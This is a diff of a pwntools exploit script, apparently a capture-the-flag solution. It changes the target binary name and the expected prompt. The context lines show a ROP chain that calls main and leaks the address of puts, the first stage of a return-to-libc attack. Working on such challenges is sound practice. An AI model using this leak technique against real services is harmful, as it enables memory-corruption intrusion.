@@ -1,7 +1,7 @@
 from pwn import *
 import sys
 
-exe = ELF("./themis")
+exe = ELF("./a.out")
 context.binary = exe.path
 HOST = ""
 PORT = -1
@@ -28,7 +28,7 @@ def main():
     rop.call(0x000000000040125E)  # main function
     log.info("obtaining address leak of puts:\n" + rop.dump())
 
-    r.recvuntil("A kind gift from Themis, to you.\n".encode())
+    r.recvuntil("input: ".encode())
 
     r.sendline((rop.chain()))
     leakedPut = r.recvline()[:8].strip()
